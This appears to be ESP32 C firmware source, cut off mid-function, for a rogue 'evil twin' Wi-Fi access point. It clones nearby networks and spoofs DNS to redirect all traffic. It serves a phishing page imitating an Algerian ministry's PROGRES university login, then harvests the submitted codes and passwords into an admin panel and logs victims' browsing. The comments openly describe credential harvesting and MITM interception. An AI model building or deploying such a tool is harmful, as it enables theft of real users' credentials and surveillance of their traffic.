#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "freertos/event_groups.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "lwip/dns.h"
#include "esp_http_server.h"
#include "esp_https_server.h"

#define ADMIN_AP_SSID        "Deauther"
#define ADMIN_AP_CHANNEL     1
#define ADMIN_AP_MAX_CLIENTS 10
#define ROGUE_AP_MAX_CLIENTS 10
#define DNS_PORT             53
#define MAX_CREDENTIALS      100
#define AP_IP                "192.168.4.1"

/* ── SPOOFED DOMAIN ────────────────────────────────────────────────
   Set this to the domain you want to appear in the browser address bar.
   Certificate must be generated for this domain.                    */
#define SPOOFED_DOMAIN       "helloworld.com"

/* ── Compile-time upstream WiFi defaults ────────────────────────────
   Change to your D-Link SSID/password, OR leave blank and set them
   at runtime via the admin page → "Connect to Router" button.       */
#define UPSTREAM_SSID     "D-Link"
#define UPSTREAM_PASSWORD "15061967"
/* ──────────────────────────────────────────────────────────────────── */

#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT      BIT1

static const char *TAG = "RogueAP";

typedef struct {
    char   email[256];
    char   password[256];
    time_t timestamp;
} Credential_t;

static Credential_t      credentials[MAX_CREDENTIALS];
static int               credential_count = 0;
static SemaphoreHandle_t credential_mutex = NULL;

static char     rogue_ssid[33]     = "FreeWiFi";
static char     rogue_password[64] = "";
static int      rogue_channel      = 6;
static bool     rogue_ap_active    = false;
static wifi_ap_record_t ap_records[20];
static uint16_t ap_count           = 0;

/* ISP upstream credentials (can be set via admin panel) */
static char     isp_ssid[33]       = UPSTREAM_SSID;
static char     isp_password[64]   = UPSTREAM_PASSWORD;
static SemaphoreHandle_t isp_creds_mutex = NULL;

static httpd_handle_t     admin_server       = NULL;
static int                dns_socket         = -1;
static bool               dns_server_running = false;
static esp_netif_t       *ap_netif           = NULL;
static esp_netif_t       *sta_netif          = NULL;
static EventGroupHandle_t wifi_event_group   = NULL;
static int                sta_retry_count    = 0;
#define STA_MAX_RETRY 5

/* ──────────────────────────────────────────────────────────────────
   THE KEY FLAG
   Set to true the instant anyone submits the login form.
   • DNS task  → stops spoofing (clients get real IPs from upstream)
   • HTTPS redirect → clients can access real internet via NAPT
   ────────────────────────────────────────────────────────────────── */
static volatile bool internet_unlocked = false;

/* ── Live traffic log ──────────────────────────────────────────────
   Circular buffer of the last 200 events (DNS queries + HTTP GETs).
   Each entry is a short null-terminated string.
   ────────────────────────────────────────────────────────────────── */
#define TRAFFIC_LOG_MAX  200
#define TRAFFIC_ENTRY_LEN 96
static char     traffic_log[TRAFFIC_LOG_MAX][TRAFFIC_ENTRY_LEN];
static int      traffic_head  = 0;   /* next write position (circular) */
static int      traffic_total = 0;   /* total events ever logged        */
static SemaphoreHandle_t traffic_mutex = NULL;

static void traffic_push(const char *entry) {
    if (!traffic_mutex) return;
    xSemaphoreTake(traffic_mutex, portMAX_DELAY);
    strncpy(traffic_log[traffic_head], entry, TRAFFIC_ENTRY_LEN - 1);
    traffic_log[traffic_head][TRAFFIC_ENTRY_LEN - 1] = '\0';
    traffic_head = (traffic_head + 1) % TRAFFIC_LOG_MAX;
    traffic_total++;
    xSemaphoreGive(traffic_mutex);
}

/* ════════════════════════════════════════════════════════════════════
   🔐 SSL CERTIFICATES — IMPORTANT!
   
   Replace these with your own generated certificates.
   Use: ./generate_cert.sh or python3 cert_to_c.py
   ════════════════════════════════════════════════════════════════════ */

/* ⚠️  PLACEHOLDER CERTIFICATES - REPLACE WITH REAL ONES ⚠️
   
   To generate real certificates for helloworld.com, run:
   
   $ openssl genrsa -out key.pem 2048
   $ openssl req -new -key key.pem -out cert.csr \
       -subj "/C=US/ST=State/L=City/O=Org/CN=helloworld.com"
   $ openssl x509 -req -days 365 -in cert.csr -signkey key.pem \
       -out cert.pem \
       -extfile <(printf "subjectAltName=DNS:helloworld.com")
   $ python3 cert_to_c.py cert.pem key.pem > certs.h
   
   Then copy the certificate and key from the generated certs.h file.
*/

// ==================== UTILITY ====================

static void url_decode(char *src, char *dst, int dst_len) {
    int i = 0, j = 0;
    while (src[i] && j < dst_len - 1) {
        if (src[i] == '%' && i + 2 < (int)strlen(src)) {
            int val;
            if (sscanf(&src[i+1], "%2x", &val) == 1) {
                dst[j++] = (char)val;
                i += 3;
                continue;
            }
        }
        dst[j++] = src[i++];
    }
    dst[j] = '\0';
}

/* ── Check if hostname is the spoofed domain ─────────────────────── */
static bool is_spoofed_domain(const char *host) {
    if (!host) return false;
    char host_only[128] = {0};
    strncpy(host_only, host, sizeof(host_only) - 1);
    char *colon = strchr(host_only, ':');
    if (colon) *colon = '\0';
    return strcmp(host_only, SPOOFED_DOMAIN) == 0;
}

// ==================== WIFI OPTIMIZATIONS ====================

/* Must be called AFTER esp_wifi_start() */
static void apply_wifi_optimizations(void) {
    esp_err_t r;

    r = esp_wifi_set_max_tx_power(84);
    if (r == ESP_OK) ESP_LOGI(TAG, "TX Power: 20 dBm");
    else             ESP_LOGE(TAG, "TX Power failed: %s", esp_err_to_name(r));

    r = esp_wifi_set_protocol(WIFI_IF_AP,
            WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
    if (r == ESP_OK) ESP_LOGI(TAG, "PHY: 802.11b/g/n");
    else             ESP_LOGE(TAG, "PHY failed: %s", esp_err_to_name(r));

    r = esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
    if (r == ESP_OK) ESP_LOGI(TAG, "BW: 20 MHz HT");
    else             ESP_LOGE(TAG, "BW failed: %s", esp_err_to_name(r));
}

// ==================== LOGIN PAGE ====================
static const char LOGIN_PAGE[] __attribute__((used)) = R"PROGRES(
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>PROGRES - منصة الإطعام الجامعي</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Cairo',sans-serif;background:#e8e8e8;min-height:100vh;display:flex;flex-direction:column}
    .top-bar{background:#2e8b57;color:#fff;text-align:center;padding:10px 20px;direction:rtl}
    .top-bar p{font-size:15px;font-weight:600;line-height:1.7}
    .page-body{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
    .card{display:flex;flex-direction:row-reverse;background:#fff;border-radius:4px;overflow:hidden;width:100%;max-width:720px;box-shadow:0 2px 12px rgba(0,0,0,0.1)}
    .brand-panel{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 30px;border-right:1px solid #e0e0e0;gap:22px}
    .brand-title{font-size:20px;font-weight:700;color:#222;text-align:center;direction:rtl;margin-top:10px}
    .brand-footer{font-size:8.5px;color:#666;text-align:center;direction:rtl;line-height:1.6;margin-top:auto}
    .form-panel{flex:1;padding:50px 36px 40px;display:flex;flex-direction:column;justify-content:center;gap:18px;direction:rtl}
    .form-title{font-size:22px;font-weight:700;color:#222;margin-bottom:6px;text-align:right}
    .field-group{display:flex;flex-direction:column;gap:6px}
    .field-label{font-size:13px;font-weight:600;color:#333;text-align:right}
    .select-wrap{position:relative}
    .select-wrap select{width:100%;padding:10px 14px;font-family:'Cairo',sans-serif;font-size:13px;color:#aaa;background:#fff;border:1px solid #ccc;border-radius:3px;appearance:none;direction:rtl;cursor:pointer;outline:none}
    .select-wrap select:focus{border-color:#2e8b57}
    .select-arrow{position:absolute;left:12px;top:50%;transform:translateY(-50%);pointer-events:none;color:#888;font-size:12px}
    input[type="text"],input[type="password"]{width:100%;padding:10px 14px;font-family:'Cairo',sans-serif;font-size:13px;border:1px solid #ccc;border-radius:3px;outline:none;direction:rtl;background:#fff;color:#333;transition:border-color .2s}
    input[type="text"]:focus,input[type="password"]:focus{border-color:#2e8b57}
    .btn-login{margin-top:6px;width:100%;padding:12px;background:#2e8b57;color:#fff;font-family:'Cairo',sans-serif;font-size:15px;font-weight:700;border:none;border-radius:3px;cursor:pointer;transition:background .2s}
    .btn-login:hover{background:#25754a}
    .btn-login:disabled{background:#7fb89a;cursor:default}
    .error-msg{font-size:13px;color:#c0392b;text-align:center;min-height:18px;display:none;direction:rtl}
    @media(max-width:560px){.card{flex-direction:column}.brand-panel{border-right:none;border-bottom:1px solid #e0e0e0;padding:28px 20px}.form-panel{padding:30px 20px}}
  </style>
</head>
<body>
  <div class="top-bar">
    <p>وزارة التعليم العالي و البحث العلمي</p>
    <p>الديوان الوطني للخدمات الجامعية</p>
  </div>
  <div class="page-body">
    <div class="card">
      <div class="form-panel">
        <h2 class="form-title">تسجيل الدخول</h2>
        <div class="field-group">
          <div class="select-wrap">
            <select id="userRole">
              <option value="" disabled selected>Select ...</option>
              <option value="1">طالب</option>
              <option value="2">أستاذ</option>
              <option value="3">إداري</option>
            </select>
            <span class="select-arrow">&#9662;</span>
          </div>
        </div>
        <div class="field-group">
          <label class="field-label" for="userCode">الرمز</label>
          <input type="text" id="userCode" autocomplete="username" spellcheck="false"/>
        </div>
        <div class="field-group">
          <label class="field-label" for="userPass">كلمة المرور</label>
          <input type="password" id="userPass" autocomplete="current-password"/>
        </div>
        <div class="error-msg" id="errMsg">يرجى ملء جميع الحقول.</div>
        <button class="btn-login" id="loginBtn" onclick="doSubmit()">تسجيل الدخول</button>
      </div>
      <div class="brand-panel">
        <h1 class="brand-title">PROGRES<br>منصة الإطعام الجامعي</h1>
        <p class="brand-footer">وزارة التعليم العالي و البحث العلمي<br>&copy; جميع الحقوق محفوظة 2024 – إصدار 1.0.0</p>
      </div>
    </div>
  </div>
  <script>
  function doSubmit() {
    var code=document.getElementById('userCode').value.trim();
    var pass=document.getElementById('userPass').value;
    var err=document.getElementById('errMsg');
    var btn=document.getElementById('loginBtn');
    if(!code||!pass){err.style.display='block';err.textContent='يرجى ملء جميع الحقول.';return;}
    btn.disabled=true;
    err.style.display='none';
    /* Send creds, then redirect regardless of response */
    var xhr=new XMLHttpRequest();
    xhr.open('POST','/submit',true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onloadend=function(){
      /* Give ESP32 100 ms to flip the flag, then redirect */
      setTimeout(function(){ window.location.href='https://www.google.com'; },100);
    };
    xhr.send('email='+encodeURIComponent(code)+'&password='+encodeURIComponent(pass));
  }
  document.addEventListener('keydown',function(e){if(e.key==='Enter')doSubmit();});
  </script>
</body>
</html>
)PROGRES";

// ==================== ADMIN PAGE ====================
static const char ADMIN_PAGE[] __attribute__((used)) = R"EOF(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>ROGUE</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#fff;font-family:monospace}
body{display:flex;flex-direction:column;overflow:hidden}
.header{background:#000;border-bottom:2px solid #00ff00;padding:16px 20px;text-align:center;flex-shrink:0}
.header h1{font-size:18px;font-weight:700;letter-spacing:2px}
.content{flex:1;overflow-y:auto;padding:20px;display:grid;grid-template-columns:1fr 1fr;gap:20px}
.panel{background:#1a1a1a;border:1px solid #333;padding:16px}
.panel-title{font-size:12px;font-weight:700;color:#00ff00;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px;border-bottom:1px solid #00ff00;padding-bottom:8px}
.form-group{margin-bottom:10px}
label{display:block;font-size:11px;color:#aaa;margin-bottom:4px;text-transform:uppercase}
input[type="text"],input[type="password"],input[type="number"]{width:100%;padding:6px 8px;background:#0a0a0a;border:1px solid #333;color:#0f0;font-family:monospace;font-size:11px}
input[type="text"]:focus,input[type="password"]:focus,input[type="number"]:focus{outline:none;border-color:#00ff00;box-shadow:0 0 5px rgba(0,255,0,0.3)}
button{padding:8px 12px;background:#000;border:1px solid #00ff00;color:#00ff00;font-family:monospace;font-size:11px;font-weight:700;cursor:pointer;text-transform:uppercase;transition:all .1s}
button:hover{background:#00ff00;color:#000}
button:disabled{opacity:0.3;cursor:default}
button.btn-kill{border-color:#ff0000;color:#ff0000}
button.btn-kill:hover{background:#ff0000;color:#000}
.btn-row{display:flex;gap:6px;margin-top:8px}
.btn-row button{flex:1}
.status-val{font-size:13px;font-weight:700;padding:6px;background:#0a0a0a;border:1px solid #333;margin:6px 0;text-align:center}
.status-val.active{color:#0f0;border-color:#00ff00}
.status-val.locked{color:#ff0000;border-color:#ff0000}
.status-val.idle{color:#888}
.box{background:#0a0a0a;border:1px solid #333;padding:8px;margin-top:6px;max-height:200px;overflow-y:auto;font-size:10px}
.item{padding:4px 6px;border-left:2px solid #00ff00;margin-bottom:4px;font-size:10px}
.item.warn{border-left-color:#ff9900}
.item.alert{border-left-color:#ff0000}
select{background:#0a0a0a;border:1px solid #333;color:#0f0;font-family:monospace;font-size:11px;padding:4px}
.info-bar{background:#000;border:1px solid #333;padding:6px 8px;font-size:10px;margin:8px 0;color:#aaa}
.traffic-mono{background:#000;color:#0f0;border:1px solid #333;padding:8px;margin-top:6px;max-height:180px;overflow-y:auto;font-size:9px;white-space:pre-wrap;word-break:break-all;font-family:monospace}
.full-width{grid-column:1/-1}
</style>
</head>
<body>
<div class="header">
  <h1>[ ROGUE AP CONTROL ]</h1>
</div>
<div class="content">
  <div class="panel">
    <div class="panel-title">[ STATUS ]</div>
    <div class="status-val idle" id="apStatus">OFFLINE</div>
    <div class="info-bar">TX: 20dBm | 802.11b/g/n | NAPT: ON | HTTP Portal</div>
  </div>


  <div class="panel">
    <div class="panel-title">[ AP CONFIG ]</div>
    <div class="form-group"><label>SSID</label><input id="ssid" value="FreeWiFi"></div>
    <div class="form-group"><label>Channel</label><input type="number" id="channel" min="1" max="13" value="6"></div>
    <div class="form-group"><label>Password</label><input type="password" id="password" placeholder="blank=open"></div>
    <div class="form-group"><label>MAC Spoof</label><input id="mac" placeholder="XX:XX:XX:XX:XX:XX"></div>
    <div class="form-group"><label>Auth Mode</label>
      <select id="am">
        <option value="0">OPEN</option>
        <option value="2">WPA-PSK</option>
        <option value="3">WPA2-PSK</option>
        <option value="4">WPA/WPA2</option>
      </select>
    </div>
    <div class="btn-row">
      <button onclick="startAP()">START</button>
      <button class="btn-kill" onclick="stopAP()">STOP</button>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title">[ SCAN ]</div>
    <button onclick="startScan()" style="width:100%">SCAN APs</button>
    <div class="box" id="scanResults">Ready</div>
  </div>

  <div class="panel full-width">
    <div class="panel-title">[ CONNECTED CLIENTS ]</div>
    <div style="display:flex;gap:6px;margin-bottom:8px">
      <input type="text" id="macFilter" placeholder="Filter by MAC (XX:XX:XX)" style="flex:1;padding:6px;background:#0a0a0a;border:1px solid #333;color:#0f0;font-size:10px">
      <button onclick="clearClients()" style="flex:0;padding:6px 12px">CLEAR</button>
    </div>
    <div class="box" id="clientsList">Waiting for connections…</div>
  </div>

  <div class="panel full-width">
    <div class="panel-title">[ INTERCEPT ]</div>
    <div class="status-val idle" id="interceptStatus">UNLOCKED</div>
    <div class="btn-row">
      <button class="btn-kill" id="btnIntercept" onclick="doIntercept()">LOCK</button>
      <button id="btnRelease" onclick="doRelease()">UNLOCK</button>
    </div>
  </div>

  <div class="panel full-width">
    <div class="panel-title">[ CREDENTIALS ]</div>
    <button onclick="document.getElementById('credsList').innerHTML=''" style="width:100%;margin-bottom:6px">CLEAR</button>
    <div class="box" id="credsList">Waiting…</div>
  </div>

  <div class="panel full-width">
    <div class="panel-title">[ ISP UPSTREAM ]</div>
    <div class="info-bar">Configure credentials for internet passthrough (no password needed)</div>
    <div class="form-group"><label>ISP AP SSID</label><input id="isp_ssid" placeholder="Target ISP router SSID"></div>
    <div class="form-group"><label>ISP Password</label><input type="password" id="isp_pass" placeholder="ISP WiFi password"></div>
    <div class="btn-row">
      <button onclick="setISPConfig()" style="flex:2">CONNECT TO ISP</button>
      <button onclick="getISPStatus()" style="flex:1">REFRESH</button>
    </div>
    <div id="ispStatus" style="margin-top:8px;padding:8px;background:#0a0a0a;border:1px solid #333;font-size:10px;color:#aaa">Disconnected</div>
  </div>
</div>
<script>
function startScan(){
  document.getElementById('scanResults').innerHTML='Scanning…';
  var x=new XMLHttpRequest();x.open('GET','/api/scan',true);x.onload=function(){setTimeout(getScan,2500);};x.send();
}
function getScan(){
  var x=new XMLHttpRequest();x.open('GET','/api/scan_results',true);
  x.onload=function(){
    try{var d=JSON.parse(x.responseText),h='';
      if(!d.count)h='None found';
      else for(var i=0;i<d.list.length;i++){
        var a=d.list[i],auth='OPEN';
        if(a.authmode===2)auth='WPA';else if(a.authmode===3)auth='WPA2';else if(a.authmode===4)auth='WPA2+';
        h+='<div class="item" style="cursor:pointer" onclick="cloneAP(\''+he(a.ssid)+'\','+a.channel+',\''+a.bssid+'\','+a.authmode+')"><b>'+he(a.ssid)+'</b><br>Ch:'+a.channel+' '+a.rssi+'dBm '+auth+'<br><small style="color:#888">'+a.bssid+'</small></div>';
      }
      document.getElementById('scanResults').innerHTML=h;
    }catch(e){}
  };x.send();
}
function startAP(){
  var s=document.getElementById('ssid').value.trim();if(!s){alert('[ ERROR ] Enter SSID');return;}
  var x=new XMLHttpRequest();x.open('POST','/api/start',true);
  x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  x.onload=function(){alert('[ OK ] AP started');getStatus();};
  x.send('ssid='+encodeURIComponent(s)+'&password='+encodeURIComponent(document.getElementById('password').value)
    +'&channel='+document.getElementById('channel').value
    +'&mac='+encodeURIComponent(document.getElementById('mac').value.trim())
    +'&authmode='+(document.getElementById('am').value||'0'));
}
function stopAP(){
  var x=new XMLHttpRequest();x.open('GET','/api/stop',true);
  x.onload=function(){alert('[ OK ] AP stopped');getStatus();};x.send();
}
function getStatus(){
  var x=new XMLHttpRequest();x.open('GET','/api/status',true);
  x.onload=function(){try{var d=JSON.parse(x.responseText),el=document.getElementById('apStatus');
    if(d.active){
      el.textContent=d.internet?'ONLINE':'WAITING';
      el.className='status-val active';
    }else{
      el.textContent='OFFLINE';
      el.className='status-val idle';
    }
    if(typeof d.internet!=='undefined') updateInterceptUI(d.internet);
  }catch(e){}};x.send();
}
function getCreds(){
  var x=new XMLHttpRequest();x.open('GET','/api/credentials',true);
  x.onload=function(){try{var d=JSON.parse(x.responseText),h='';
    if(!d.count)h='No credentials';
    else for(var i=0;i<d.list.length;i++)h+='<div class="item"><b>'+he(d.list[i].email)+'</b><small> / '+he(d.list[i].password)+'</small></div>';
    document.getElementById('credsList').innerHTML=h;
  }catch(e){}};x.send();
}
function doIntercept(){
  var x=new XMLHttpRequest();x.open('GET','/api/intercept',true);
  x.onload=function(){ updateInterceptUI(false); };
  x.send();
}
function doRelease(){
  var x=new XMLHttpRequest();x.open('GET','/api/release',true);
  x.onload=function(){ updateInterceptUI(true); };
  x.send();
}
function updateInterceptUI(unlocked){
  var el=document.getElementById('interceptStatus');
  var bi=document.getElementById('btnIntercept');
  var br=document.getElementById('btnRelease');
  if(unlocked){
    el.textContent='UNLOCKED';
    el.className='status-val active';
    bi.disabled=false;
    br.disabled=true;br.style.opacity='0.4';
  } else {
    el.textContent='LOCKED';
    el.className='status-val locked';
    bi.disabled=true;bi.style.opacity='0.4';
    br.disabled=false;br.style.opacity='1';
  }
}
function he(t){return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function cloneAP(ssid,ch,bssid,am){
  document.getElementById('ssid').value=ssid;
  document.getElementById('channel').value=ch;
  document.getElementById('mac').value=bssid;
  document.getElementById('am').value=String(am);
  alert('[ CLONED ] '+ssid+' ch:'+ch+' MAC:'+bssid+' auth:'+am);
}
function getClients(){
  var x=new XMLHttpRequest();x.open('GET','/api/clients',true);
  x.onload=function(){
    try{var d=JSON.parse(x.responseText);
      var filter=document.getElementById('macFilter').value.trim().toUpperCase();
      var h='';
      if(!d.count || d.count===0){
        h='No clients connected';
      }else{
        h='<b>Connected: '+d.count+'</b><br>';
        for(var i=0;i<d.clients.length;i++){
          var c=d.clients[i];
          var mac=c.mac.toUpperCase();
          if(filter && mac.indexOf(filter)===-1)continue;
          h+='<div class="item"><b>'+mac+'</b> <small style="color:#888">'+c.rssi+'dBm</small></div>';
        }
      }
      document.getElementById('clientsList').innerHTML=h;
    }catch(e){console.log(e);}
  };x.send();
}
function clearClients(){
  document.getElementById('macFilter').value='';
  getClients();
}
function setISPConfig(){
  var ssid=document.getElementById('isp_ssid').value.trim();
  var pass=document.getElementById('isp_pass').value.trim();
  if(!ssid){alert('[ ERROR ] Enter ISP SSID');return;}
  var x=new XMLHttpRequest();x.open('POST','/api/isp_config',true);
  x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  x.onload=function(){
    try{var d=JSON.parse(x.responseText);
      alert('[ ISP ] '+d.msg);
      getISPStatus();
    }catch(e){alert('[ ERROR ] '+e);}
  };
  x.send('ssid='+encodeURIComponent(ssid)+'&password='+encodeURIComponent(pass));
}
function getISPStatus(){
  var x=new XMLHttpRequest();x.open('GET','/api/isp_status',true);
  x.onload=function(){
    try{var d=JSON.parse(x.responseText);
      var st=d.isp_connected?'🟢 CONNECTED':'🔴 DISCONNECTED';
      document.getElementById('ispStatus').innerHTML='<b>'+st+'</b><br>SSID: '+he(d.isp_ssid);
    }catch(e){}
  };x.send();
}
setInterval(function(){getStatus();getCreds();getClients();getISPStatus();},3000);getStatus();getCreds();getClients();getISPStatus();
</script>
</body>
</html>
)EOF";

// ==================== DNS SERVER ====================
static void dns_server_task(void *arg __attribute__((unused))) {
    dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (dns_socket < 0) { ESP_LOGE(TAG, "DNS socket failed"); vTaskDelete(NULL); return; }

    int ov = 1;
    setsockopt(dns_socket, SOL_SOCKET, SO_REUSEADDR, &ov, sizeof(ov));

    struct sockaddr_in da = {
        .sin_family      = AF_INET,
        .sin_addr.s_addr = htonl(INADDR_ANY),
        .sin_port        = htons(DNS_PORT),
    };
    if (bind(dns_socket, (struct sockaddr *)&da, sizeof(da)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed"); close(dns_socket); vTaskDelete(NULL); return;
    }

    struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
    setsockopt(dns_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    ESP_LOGI(TAG, "🔐 DNS server on port 53 (spoofing: " SPOOFED_DOMAIN ")");

    uint8_t buf[512];
    struct sockaddr_in ca; socklen_t cl;

    /* upstream DNS forwarder socket (used after internet_unlocked) */
    struct sockaddr_in upstream_dns = {
        .sin_family      = AF_INET,
        .sin_port        = htons(53),
        .sin_addr.s_addr = inet_addr("8.8.8.8"),
    };

    while (dns_server_running) {
        cl = sizeof(ca);
        int n = recvfrom(dns_socket, buf, sizeof(buf), 0, (struct sockaddr *)&ca, &cl);

        if (n > 12) {
            /* Extract domain name first (for logging) */
            char qname[64] = {0};
            int qi = 12, qo = 0;
            while (qi < n && buf[qi] != 0 && qo < 63) {
                int ll = buf[qi++];
                if (!ll || qi + ll > n) break;
                if (qo) qname[qo++] = '.';
                for (int l = 0; l < ll && qo < 63; l++) qname[qo++] = buf[qi++];
            }

            /* Get client IP for logging */
            char client_ip[16] = {0};
            snprintf(client_ip, sizeof(client_ip), "%d.%d.%d.%d",
                     ((uint8_t*)&ca.sin_addr.s_addr)[0],
                     ((uint8_t*)&ca.sin_addr.s_addr)[1],
                     ((uint8_t*)&ca.sin_addr.s_addr)[2],
                     ((uint8_t*)&ca.sin_addr.s_addr)[3]);

            /* LOG DNS QUERY ALWAYS (before forward/spoof decision) */
            ESP_LOGI(TAG, "🌐 SITE: [%s] %s", client_ip, qname);
            {
                char _te[TRAFFIC_ENTRY_LEN];
                snprintf(_te, sizeof(_te), "DNS  [%s] %.40s", client_ip, qname);
                traffic_push(_te);
            }

            /* Now decide: forward or spoof */
            if (internet_unlocked) {
                /* ── FORWARD mode ─────────────────────────────────────────────
                   Open a temporary UDP socket, send the original query to
                   8.8.8.8:53, wait up to 1.5 s for the real answer, then
                   relay it straight back to the client.
                   ──────────────────────────────────────────────────────────── */
                int fwd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if (fwd >= 0) {
                    struct timeval ftv = { .tv_sec = 1, .tv_usec = 500000 };
                    setsockopt(fwd, SOL_SOCKET, SO_RCVTIMEO, &ftv, sizeof(ftv));

                    if (sendto(fwd, buf, n, 0,
                               (struct sockaddr *)&upstream_dns,
                               sizeof(upstream_dns)) > 0) {
                        uint8_t rbuf[512];
                        int rn = recv(fwd, rbuf, sizeof(rbuf), 0);
                        if (rn > 0) {
                            sendto(dns_socket, rbuf, rn, 0,
                                   (struct sockaddr *)&ca, cl);
                            ESP_LOGD(TAG, "DNS FWD [%s] ✓ response relayed", client_ip);
                        } else {
                            ESP_LOGW(TAG, "DNS FWD [%s] timeout from 8.8.8.8", client_ip);
                        }
                    }
                    close(fwd);
                }
            } else {
                /* ── SPOOF mode ───────────────────────────────────────────────
                   Redirect all queries to rogue AP (192.168.4.1)
                   ──────────────────────────────────────────────────────────── */
                uint8_t resp[512];
                memcpy(resp, buf, n);
                resp[2] = (buf[2] & 0x01) | 0x85;
                resp[3] = 0x80;
                resp[6] = 0x00; resp[7] = 0x01;

                if (n + 16 < (int)sizeof(resp)) {
                    resp[n]    = 0xc0; resp[n+1]  = 0x0c;
                    resp[n+2]  = 0x00; resp[n+3]  = 0x01;
                    resp[n+4]  = 0x00; resp[n+5]  = 0x01;
                    resp[n+6]  = 0x00; resp[n+7]  = 0x00;
                    resp[n+8]  = 0x00; resp[n+9]  = 0x00;
                    resp[n+10] = 0x00; resp[n+11] = 0x04;
                    resp[n+12] = 192;  resp[n+13] = 168;
                    resp[n+14] = 4;    resp[n+15] = 1;
                    sendto(dns_socket, resp, n + 16, 0, (struct sockaddr *)&ca, cl);
                }
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    close(dns_socket);
    vTaskDelete(NULL);
}

// ==================== HTTP/HTTPS HANDLERS ====================

static esp_err_t handle_submit(httpd_req_t *req);

static void get_host(httpd_req_t *req, char *buf, size_t len) {
    memset(buf, 0, len);
    if (httpd_req_get_hdr_value_str(req, "Host", buf, len) != ESP_OK)
        strncpy(buf, SPOOFED_DOMAIN, len - 1);
}

static esp_err_t handle_captive_post(httpd_req_t *req) {
    if (strcmp(req->uri, "/submit") == 0) return handle_submit(req);
    
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "https://" SPOOFED_DOMAIN "/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t handle_admin(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    httpd_resp_send(req, ADMIN_PAGE, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

/* ────────────────────────────────────────────────────────────────────
   handle_submit — THE CRITICAL HANDLER
   Step 1: Flip internet_unlocked = true   ← must be first
   Step 2: Save credentials (deduplicated)
   Step 3: Return 204 so the JS does the redirect from the browser
   ──────────────────────────────────────────────────────────────────── */
static esp_err_t handle_submit(httpd_req_t *req) {
    char content[512] = {0};
    int  n = httpd_req_recv(req, content, sizeof(content) - 1);

    /* STEP 1 — unlock internet immediately */
    if (!internet_unlocked) {
        internet_unlocked = true;
        ESP_LOGI(TAG, "🌐🔓 Internet UNLOCKED");
        ESP_LOGI(TAG, "   • DNS spoofing DISABLED → real upstream DNS");
        ESP_LOGI(TAG, "   • NAPT forwarding ACTIVE");
        ESP_LOGI(TAG, "   • MiTM transparent proxy ENABLED");
        ESP_LOGI(TAG, "   • Client traffic: Rogue AP ↔ Your ESP32 ↔ ISP AP ↔ Internet");
        {
            char _te[TRAFFIC_ENTRY_LEN];
            snprintf(_te, sizeof(_te), "MITM *** TRANSPARENT PROXY ACTIVATED ***");
            traffic_push(_te);
        }
    }

    /* STEP 2 — parse & save */
    if (n > 0) {
        char  email[256]   = {0};
        char  password[256]= {0};
        char *ep = strstr(content, "email=");
        char *pp = strstr(content, "password=");

        if (ep) {
            ep += 6;
            char *end = strchr(ep, '&');
            int   len = end ? (int)(end - ep) : (int)strlen(ep);
            if (len > 0 && len < (int)sizeof(email)) {
                strncpy(email, ep, len);
                for (int i = 0; i < len; i++) if (email[i] == '+') email[i] = ' ';
            }
        }
        if (pp) {
            pp += 9;
            int len = (int)strlen(pp);
            if (len > 0 && len < (int)sizeof(password)) {
                strncpy(password, pp, len);
                for (int i = 0; i < len; i++) if (password[i] == '+') password[i] = ' ';
            }
        }

        if (strlen(email) > 0 && strlen(password) > 0) {
            xSemaphoreTake(credential_mutex, portMAX_DELAY);
            bool dup = false;
            for (int i = 0; i < credential_count; i++)
                if (!strcmp(credentials[i].email, email) &&
                    !strcmp(credentials[i].password, password)) { dup = true; break; }
            if (!dup && credential_count < MAX_CREDENTIALS) {
                strncpy(credentials[credential_count].email,    email,    255);
                strncpy(credentials[credential_count].password, password, 255);
                credentials[credential_count].timestamp = time(NULL);
                credential_count++;
                ESP_LOGI(TAG, "✅ CAPTURED: %s / %s", email, password);
                {
                    char _te[TRAFFIC_ENTRY_LEN];
                    snprintf(_te, sizeof(_te), "CRED user=%.35s pass=%.35s", email, password);
                    traffic_push(_te);
                }
                /* Note: Using cloned AP credentials (UPSTREAM_SSID/UPSTREAM_PASSWORD)
                   for upstream connection, not captured user credentials.
                   Captured credentials are for credential harvesting only. */
            }
